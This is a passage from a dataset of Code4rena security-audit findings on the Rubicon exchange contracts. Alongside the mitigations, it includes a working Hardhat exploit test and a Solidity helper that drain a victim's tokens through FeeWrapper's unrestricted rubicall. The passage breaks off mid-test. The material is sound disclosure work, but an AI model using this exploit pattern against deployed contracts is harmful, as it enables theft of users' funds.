the fill_amt finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of buyAllAmount to be incorrect\n```solidity\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
        "recommendation": "## Recommended Mitigation Steps\nChange to\n```diff\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n-       fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
        "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nNone\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n\n\n# Vulnerability details\n\n## Impact\nbuyAllAmount will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.\n\nConsider WBTC price is 10000 USDC and the total fee is 10%.\nThe user calls buyAllAmount to buy 1 WBTC, and the calculated fill_amt is 10,000 USDC.\n```solidity\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                mul(buy_amt, 1 ether) <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        mul(buy_amt, 10 ** 9),\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10 ** 9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n```\nIn the buy function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC, that is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and the fill_amt finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of buyAllAmount to be incorrect\n```solidity\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n## Tools Used\nNone\n## Recommended Mitigation Steps\nChange to\n```diff\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n-       fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 766,
      "page_start": null,
      "heading": "766. Some offers can't be cancelled",
      "heading_cleaned": "Some offers can't be cancelled",
      "markdown": "# Lines of code\n\n https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\n\n\n# Vulnerability details\n\n## Impact\n\nA normal user can't cancel his offer when using a specific API.\n\n## Proof of Concept\n\n1. The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.\n(Note that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89))\n\n2. The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.\n\nWhen a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`.\n\nAfter some time the user wants to cancel his order. He can only call `RubiconMarket`'s `cancel` function(2). When he calls `cancel` what will happen is:\n1. [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.\n\n2. [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.\n\n3. require check will fail because `_hide` returned `false`.\n\nTherefore the user won't be able to cancel his offer.\n\n### Exploit\n\nExploit: can't cancel when creating an offer with `SimpleMarket`'s `offer`. (Add this to `ProtocolDeployment.t.sol`)\n``` solidity\nfunction test_ExploitCantCancel() public {\n  uint id;\n  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`\n  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);\n\n  // The created offer can't be cancelled! The following line will revert with \"Reason: can't hide\"\n  vm.expectRevert(\"can't hide\");\n  market.cancel(id);\n}\n```\n\n\n## Recommended Mitigation Steps\n\nOverride the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.\nAdd this offer function:\n```solidity\nfunction offer(\n    uint256 pay_amt,\n    ERC20 pay_gem,\n    uint256 buy_amt,\n    ERC20 buy_gem,\n    address owner,\n    address recipient\n) public override can_offer returns (uint256) {\n    return\n        offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            true,\n            owner,\n            recipient\n        );\n  }\n```\n",
      "markdown_raw": "# Lines of code\n\n https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\n\n\n# Vulnerability details\n\n## Impact\n\nA normal user can't cancel his offer when using a specific API.\n\n## Proof of Concept\n\n1. The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.\n(Note that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89))\n\n2. The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.\n\nWhen a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`. \n\nAfter some time the user wants to cancel his order. He can only call `RubiconMarket`'s `cancel` function(2). When he calls `cancel` what will happen is:\n1. [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.\n\n2. [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.\n\n3. require check will fail because `_hide` returned `false`.\n\nTherefore the user won't be able to cancel his offer.\n\n### Exploit\n\nExploit: can't cancel when creating an offer with `SimpleMarket`'s `offer`. (Add this to `ProtocolDeployment.t.sol`)\n``` solidity\nfunction test_ExploitCantCancel() public {\n  uint id;\n  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`\n  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);\n\n  // The created offer can't be cancelled! The following line will revert with \"Reason: can't hide\"\n  vm.expectRevert(\"can't hide\");\n  market.cancel(id);\n}\n```\n\n\n## Recommended Mitigation Steps\n\nOverride the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.\nAdd this offer function:\n```solidity\nfunction offer(\n    uint256 pay_amt,\n    ERC20 pay_gem,\n    uint256 buy_amt,\n    ERC20 buy_gem,\n    address owner,\n    address recipient\n) public override can_offer returns (uint256) {\n    return\n        offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            true,\n            owner,\n            recipient\n        );\n  }\n```\n",
      "description": null,
      "impact": "## Impact\n\nA normal user can't cancel his offer when using a specific API.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nOverride the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.\nAdd this offer function:\n```solidity\nfunction offer(\n    uint256 pay_amt,\n    ERC20 pay_gem,\n    uint256 buy_amt,\n    ERC20 buy_gem,\n    address owner,\n    address recipient\n) public override can_offer returns (uint256) {\n    return\n        offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            true,\n            owner,\n            recipient\n        );\n  }\n```\n",
      "poc": "## Proof of Concept\n\n1. The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.\n(Note that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89))\n\n2. The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.\n\nWhen a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`.\n\nAfter some time the user wants to cancel his order. He can only call `RubiconMarket`'s `cancel` function(2). When he calls `cancel` what will happen is:\n1. [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.\n\n2. [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.\n\n3. require check will fail because `_hide` returned `false`.\n\nTherefore the user won't be able to cancel his offer.\n\n### Exploit\n\nExploit: can't cancel when creating an offer with `SimpleMarket`'s `offer`. (Add this to `ProtocolDeployment.t.sol`)\n``` solidity\nfunction test_ExploitCantCancel() public {\n  uint id;\n  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`\n  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);\n\n  // The created offer can't be cancelled! The following line will revert with \"Reason: can't hide\"\n  vm.expectRevert(\"can't hide\");\n  market.cancel(id);\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\n https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nA normal user can't cancel his offer when using a specific API.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nOverride the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.\nAdd this offer function:\n```solidity\nfunction offer(\n    uint256 pay_amt,\n    ERC20 pay_gem,\n    uint256 buy_amt,\n    ERC20 buy_gem,\n    address owner,\n    address recipient\n) public override can_offer returns (uint256) {\n    return\n        offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            true,\n            owner,\n            recipient\n        );\n  }\n```\n",
        "poc": "## Proof of Concept\n\n1. The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.\n(Note that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89))\n\n2. The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.\n\nWhen a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`.\n\nAfter some time the user wants to cancel his order. He can only call `RubiconMarket`'s `cancel` function(2). When he calls `cancel` what will happen is:\n1. [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.\n\n2. [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.\n\n3. require check will fail because `_hide` returned `false`.\n\nTherefore the user won't be able to cancel his offer.\n\n### Exploit\n\nExploit: can't cancel when creating an offer with `SimpleMarket`'s `offer`. (Add this to `ProtocolDeployment.t.sol`)\n``` solidity\nfunction test_ExploitCantCancel() public {\n  uint id;\n  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`\n  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);\n\n  // The created offer can't be cancelled! The following line will revert with \"Reason: can't hide\"\n  vm.expectRevert(\"can't hide\");\n  market.cancel(id);\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\n https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\n\n\n# Vulnerability details\n\n## Impact\n\nA normal user can't cancel his offer when using a specific API.\n\n## Proof of Concept\n\n1. The function [`offer`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511) of `SimpleMarket` is not overridden by the `RubiconMarket` contract.\n(Note that this function is called in the testing [example](https://github.com/code-423n4/2023-04-rubicon/blob/main/test/foundry-tests/ProtocolDeployment.t.sol#L89))\n\n2. The [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452) function inside `SimpleMarket` is overridden by the [`cancel`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L871) function in `RubiconMarket`.\n\nWhen a normal user creates an offer with the `SimpleMarket` API(1), the offer is not inserted into the linked list `_rank`.\n\nAfter some time the user wants to cancel his order. He can only call `RubiconMarket`'s `cancel` function(2). When he calls `cancel` what will happen is:\n1. [`isOfferSorted`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L876) will return `false` because the offer was never inserted into `_rank`.\n\n2. [`_hide`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L879) will also return `false`, Because the offer was not inserted into the unsorted list `_near`.\n\n3. require check will fail because `_hide` returned `false`.\n\nTherefore the user won't be able to cancel his offer.\n\n### Exploit\n\nExploit: can't cancel when creating an offer with `SimpleMarket`'s `offer`. (Add this to `ProtocolDeployment.t.sol`)\n``` solidity\nfunction test_ExploitCantCancel() public {\n  uint id;\n  // Create an offer with the function `offer(uint256,ERC20,uint256,ERC20,address,address)` in `SimpleMarket`\n  id = market.offer(90e6, TUSDC, 100e18, TEST, address(this), owner);\n\n  // The created offer can't be cancelled! The following line will revert with \"Reason: can't hide\"\n  vm.expectRevert(\"can't hide\");\n  market.cancel(id);\n}\n```\n\n\n## Recommended Mitigation Steps\n\nOverride the `offer` function in `SimpleMarket` with the `offer` function in `RubiconMarket`.\nAdd this offer function:\n```solidity\nfunction offer(\n    uint256 pay_amt,\n    ERC20 pay_gem,\n    uint256 buy_amt,\n    ERC20 buy_gem,\n    address owner,\n    address recipient\n) public override can_offer returns (uint256) {\n    return\n        offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            true,\n            owner,\n            recipient\n        );\n  }\n```\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 767,
      "page_start": null,
      "heading": "767. An attacker can steal all tokens of users that use `FeeWrapper`",
      "heading_cleaned": "An attacker can steal all tokens of users that use `FeeWrapper`",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all tokens of users that use `FeeWrapper`.\n\n## Proof of Concept\n\nThere is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter`\nthrough the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead\nof the address of the user. This will cause all offers to be owned by `FeeWrapper`.\n\nThis means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw his tokens\non his behalf. Here is an example of the flow of events that could occur:\n\n1. A victim sends his token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts\n    - The 3rd party creates an offer through the `FeeWrapper`.\n2. A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.\n3. The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.\n\n\nAs seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). So, for example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.\n\n\n### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`\n\nThis exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`\nby creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his\ntokens.\n\nWe modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and\nmodified the `pepeFinance` to use our example 3rd party.\n\n```typescript\nimport { loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { parseUnits } from \"ethers/lib/utils\";\nimport { ethers } from \"hardhat\";\nconst { expect } = require(\"chai\");\n\ndescribe(\"Fee Wrapper\", function () {\n  const FEE_TO = \"0x0000000000000000000000000000000000000FEE\";\n\n  async function deployRubiProtocolFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();\n\n    const WETH = await ethers.getContractFactory(\"WETH9\");\n    const weth = await WETH.deploy();\n\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const interestRateModelFacStory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n    const name = \"Test Bath Token\"; // TODO: move this process to Bath House factory\n    const symbol = \"bathTEST\";\n    const decimal = 18;\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    const cTokenDelegatorFactory = await ethers.getContractFactory(\n      \"CErc20Delegator\"\n    );\n\n    const cWETH = await cTokenDelegatorFactory\n      .deploy(\n        weth.address,\n        comptroller.address,\n        interestRateModel,\n        initialExchangeRateMantissa,\n        \"WETH\",\n        \"WETH\",\n        decimal,\n        owner.address, // Admin!\n        cTokenImplementation.address,\n        becomeImplementationData\n      )\n      .catch((e) => {\n        console.log(\"\\nError deploying cWETH!\", e.reason, \"\\n\");\n      });\n    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    const RubiconMarketFactory = await ethers.getContractFactory(\n      \"RubiconMarket\"\n    );\n    const rubiconMarket = await RubiconMarketFactory.deploy();\n    await rubiconMarket.initialize(testMaker.address);\n    await rubiconMarket.setFeeBPS(10);\n\n    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.\n    await testCoin.connect(owner).faucet();\n    await testStableCoin.connect(owner).faucet();\n\n    await testCoin.connect(owner).transfer(victim.address, parseUnits(\"999\"));\n\n    await testCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n    await testStableCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"90\", 6),\n      testStableCoin.address,\n      parseUnits(\"100\"),\n      testCoin.address,\n      { from: owner.address }\n    );\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"100\"),\n      testCoin.address,\n      parseUnits(\"110\", 6),\n      testStableCoin.address,\n      { from: owner.address }\n    );\n\n    const RubiconRouter = await ethers.getContractFactory(\"RubiconRouter\");\n    const router = await RubiconRouter.deploy();\n    await router.startErUp(rubiconMarket.address, weth.address);\n\n    // fee wrapper\n    const FeeWrapper = await ethers.getContractFactory(\"FeeWrapper\");\n    const feeWrapper = await FeeWrapper.deploy();\n\n    // 3rd party protocol\n    const PepeFinance = await ethers.getContractFactory(\"Some3rdPartyProtocol\");\n    const pepeFinance = await PepeFinance.deploy(\n      feeWrapper.address,\n      FEE_TO,\n      rubiconMarket.address\n    );\n\n    await testCoin!.connect(owner).approve(router.address, parseUnits(\"320\"));\n\n    return {\n      rubiconMarket,\n      testCoin,\n      owner,\n      otherAccount,\n      testStableCoin,\n      weth,\n      cWETH,\n      router,\n      feeWrapper,\n      pepeFinance,\n      attacker,\n      victim\n    };\n  }\n  it(\"Exploit steal all tokens from offers created with the `FeeWrapper`\", async function () {\n    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(\n      deployRubiProtocolFixture\n    );\n\n    let victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim has a lot of tokens. Victim's balance = \", victimBalance)\n\n    // Victim puts all his hard-earned money into an offer\n    let pay_amt = testCoin.balanceOf(victim.address);\n    await testCoin\n      .connect(victim)\n      .approve(pepeFinance.address, pay_amt);\n    await pepeFinance.connect(victim).executeOffer(\n      pay_amt,\n      testCoin.address,\n      parseUnits(\"110\"),\n      testStableCoin.address,\n      0\n    );\n    // This is the 3rd offer, hence it would get and ID of 3\n    const victimOfferId = 3;\n\n    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"Before attack attacker has no tokens. Attacker's balance = \", attackerBalance)\n\n\n    let ABI = [\n      \"function cancel(uint256 id)\",\n      \"function transfer(address to, uint256 amount)\"\n    ];\n    let iface = new ethers.utils.Interface(ABI);\n\n    // The attaacker calls `cancel` through the `FeeWrapper`.\n    // This steals the victim's tokens and puts them into the FeeWrapper\n    let cancelFunc = iface.getFunction(\"cancel\")\n    let cancelFuncSig = iface.getSighash(cancelFunc)\n    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])\n    await feeWrapper.rubicall(\n      {\n        selector: cancelFuncSig,\n        args: cancelFuncParams,\n        target: rubiconMarket.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: parseUnits(\"0\"),\n          feeAmount: parseUnits(\"0\"),\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account\n    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)\n    let transferFunc = iface.getFunction(\"transfer\")\n    let transferFuncSig = iface.getSighash(transferFunc)\n    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])\n    await feeWrapper.rubicall(\n      {\n        selector: transferFuncSig,\n        args: transferFuncParams,\n        target: testCoin.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: 0,\n          feeAmount: 0,\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"After attack, attacker has all of the victims tokens. Attacker's balance = \", attackerBalance)\n    victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim is left with nothing. Victim's balance = \", victimBalance)\n\n    // Assert that we really stole all victim's tokens\n    expect(attackerBalance).to.be.gt(0);\n    expect(victimBalance).to.equal(0);\n  })\n});\n```\n\nAnd we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"../RubiconMarket.sol\";\nimport \"../utilities/FeeWrapper.sol\";\n\ncontract Some3rdPartyProtocol {\n    address public feeWrapper;\n    uint256 feeType = 10_000; // BPS\n    uint256 fee = 10; // 10/10_000\n    address feeTo;\n    address rubiMarket;\n\n    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {\n        feeWrapper = _feeWrapper;\n        feeTo = _feeTo;\n        rubiMarket = _rubiMarket;\n    }\n\n    function executeOffer(\n        uint256 pay_amt,\n        address pay_gem,\n        uint256 buy_amt,\n        address buy_gem,\n        uint256 pos\n    ) external returns (uint256) {\n        uint256[] memory tokenAmounts = new uint256[](2);\n        bytes memory id;\n        tokenAmounts[0] = pay_amt;\n    tokenAmounts[1] = buy_amt;\n\n        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);\n\n        // calculate fee to pay using FeeWrapper\n        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(\n            feeWrapper\n        ).calculateFee(tokenAmounts, feeType, fee);\n\n        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(\n            pay_gem,\n            pay_amt,\n            fees_[0],\n            feeTo\n        );\n\n        // update both pay_amt and buy_amt_min with fee deducted\n        pay_amt = new_amounts[0];\n\n        // Call rubiMarket.offer\n        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(\n            bytes4(keccak256(bytes(\"offer(uint256,address,uint256,address)\"))),\n            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),\n            rubiMarket,\n            feeParams\n        );\n        id = FeeWrapper(feeWrapper).rubicall(params);\n\n        return uint256(bytes32(id));\n    }\n}\n```\n\nIf you run the test, you'll see the following output\n\n```\n$ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts\n\nThe victim has a lot of tokens. Victim's balance =  `999000000000000000000`\nBefore attack attacker has no tokens. Attacker's balance =  `0`\nAfter attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`\nThe victim is left with nothing. Victim's balance =  `0`\n```\n\n### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`\n\nTo emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol` as\nwell. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is\nnot capable of accepting `eth`.\n\n\nThe following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds.\n\nJust to be clear, currently, an honest user making an offer can't cancel his own offer.\n\nWe added the following test to `fee-wrapper.ts` that shows this exploit:\n\n\n```solidity\nit(\"should call offerWithETH via 3d party AND STEAL IT ALL!\", async function () {\n  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(\n    deployRubiProtocolFixture\n  );\n\n  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);\n  await pepeFinance.executeOfferWithETH(\n    parseUnits(\"9\"),\n    parseUnits(\"310\"),\n    testCoin.address,\n    0,\n    { value: parseUnits(\"9\") }\n  );\n  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);\n  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);\n\n  // The attacker calls the `FeeWrapper` directly\n  let ABI = [\n    \"function cancelForETH(uint256 id)\"\n  ];\n  let iface = new ethers.utils.Interface(ABI);\n  let cancelFunc = iface.getFunction(\"cancelForETH\")\n  let cancelFuncSig = iface.getSighash(cancelFunc)\n  let cancelFuncParams = 